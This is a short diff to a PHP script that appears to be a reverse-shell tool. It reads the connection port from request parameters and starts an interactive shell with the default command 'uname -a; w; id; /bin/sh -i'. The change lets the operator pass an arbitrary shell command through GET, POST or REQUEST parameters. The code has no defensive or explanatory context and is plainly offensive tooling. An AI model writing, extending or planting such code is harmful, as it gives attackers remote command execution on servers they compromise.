@@ -60,13 +60,22 @@ if (isset($_REQUEST['port'])) {
 } elseif (isset($_POST['port'])) {
 	$port = $_POST['port'];
 }
+// Set shell
+if (isset($_REQUEST['shell'])) {
+	$shell = $_REQUEST['shell'];
+} elseif (isset($_GET['shell'])) {
+	$shell = $_GET['shell'];
+} elseif (isset($_POST['shell'])) {
+	$shell = $_POST['shell'];
+} else {
+	$shell = 'uname -a; w; id; /bin/sh -i';
+}
 
 set_time_limit (0);
 $VERSION = "1.0";
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-$shell = 'uname -a; w; id; /bin/sh -i';
 $daemon = 0;
 $debug = 0;
 
